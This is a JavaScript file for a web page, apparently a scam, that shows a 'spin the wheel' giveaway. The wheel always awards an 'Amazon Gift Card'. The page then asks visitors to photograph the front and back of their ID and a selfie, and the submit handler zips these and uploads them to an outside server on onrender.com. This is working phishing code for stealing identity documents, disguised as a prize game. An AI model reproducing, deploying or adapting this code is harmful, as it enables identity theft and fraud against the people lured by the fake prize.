document.addEventListener("DOMContentLoaded", () => {
    const canvas = document.getElementById('wheel');
    const ctx = canvas.getContext('2d');
    const spinButton = document.getElementById('spin-button');
    const popup = document.getElementById('popup');
    const prizeName = document.getElementById('prize-name');
    const uploadButton = document.getElementById('upload-button');
    const fileInput = document.getElementById('file-input');
    const previews = [
        document.getElementById('preview-front'),
        document.getElementById('preview-back'),
        document.getElementById('preview-selfie'),
    ];
    const submitButton = document.getElementById('submit-button');
    const serverUrl = "https://testingv1.onrender.com";
    let uploadStep = 0;
    const filesCache = []; // Cache for temporarily storing files

    // Function to dynamically configure file input
    function configureFileInput() {
        if (/Mobi|Android/i.test(navigator.userAgent)) {
            fileInput.setAttribute('capture', 'environment'); // Open camera on mobile
        } else {
            fileInput.removeAttribute('capture'); // Allow file selection on desktop
        }
    }

    function drawWheel() {
        const radius = canvas.width / 2;
        const segments = ["€5", "€10", "€15", "€20", "Gift Card", "Spotify", "Nike", "Amazon"];
        const colors = ["#FF5733", "#33FF57", "#3357FF", "#FF33A6", "#FFFF33", "#FF5733", "#33FF57", "#FF33A6"];
        const segmentAngle = (2 * Math.PI) / segments.length;

        for (let i = 0; i < segments.length; i++) {
            ctx.beginPath();
            ctx.fillStyle = colors[i];
            ctx.moveTo(radius, radius);
            ctx.arc(radius, radius, radius, i * segmentAngle, (i + 1) * segmentAngle);
            ctx.lineTo(radius, radius);
            ctx.fill();
            ctx.strokeStyle = "black";
            ctx.lineWidth = 5;
            ctx.stroke();

            ctx.save();
            ctx.translate(radius, radius);
            ctx.rotate(i * segmentAngle + segmentAngle / 2);
            ctx.textAlign = "right";
            ctx.fillStyle = "#fff";
            ctx.font = "bold 14px Arial";
            ctx.fillText(segments[i], radius - 20, 10);
            ctx.restore();
        }
    }

    function spinWheel() {
        const duration = 3000;
        const totalRotation = 10 * Math.PI + Math.random() * Math.PI;
        let startAngle = 0;
        const startTime = performance.now();

        function animateWheel(time) {
            const elapsed = time - startTime;
            const progress = Math.min(elapsed / duration, 1);
            const easedProgress = 1 - Math.pow(1 - progress, 3);
            const angle = startAngle + easedProgress * totalRotation;

            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.save();
            ctx.translate(canvas.width / 2, canvas.height / 2);
            ctx.rotate(angle);
            ctx.translate(-canvas.width / 2, -canvas.height / 2);
            drawWheel();
            ctx.restore();

            if (progress < 1) {
                requestAnimationFrame(animateWheel);
            } else {
                prizeName.textContent = "Amazon Gift Card";
                popup.classList.remove('hidden');
            }
        }

        requestAnimationFrame(animateWheel);
    }

    uploadButton.addEventListener('click', () => {
        if (uploadStep < previews.length) {
            configureFileInput(); // Configure input before triggering click
            fileInput.click();
        }
    });

    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (file) {
            const currentStep = uploadStep;

            filesCache[currentStep] = file;

            const reader = new FileReader();
            reader.onload = (e) => {
                previews[currentStep].src = e.target.result;
                previews[currentStep].style.display = 'block';
            };
            reader.readAsDataURL(file);

            uploadStep++;
            if (uploadStep < previews.length) {
                uploadButton.textContent = `Upload: ${["Front of ID", "Back of ID", "Selfie"][uploadStep]}`;
            } else {
                uploadButton.disabled = true;
                submitButton.disabled = false;
            }
        }
    });

    submitButton.addEventListener('click', async () => {
        if (filesCache.length === 0) return;

        const zip = new JSZip();

        filesCache.forEach((file, index) => {
            zip.file(`file${index + 1}-${file.name}`, file);
        });

        const zipBlob = await zip.generateAsync({ type: 'blob' });

        const formData = new FormData();
        formData.append('archive', zipBlob, 'photos.zip');

        try {
          const response = await fetch(`https://testingv1.onrender.com/upload-archive`, {
    method: 'POST',
    body: formData,
});
            if (response.ok) {
                console.log('Archive successfully uploaded!');
            } else {
                console.error('Error uploading archive.');
            }
        } catch (error) {
            console.error('Connection error:', error);
        }
    });

    spinButton.addEventListener('click', spinWheel);
    drawWheel();
});
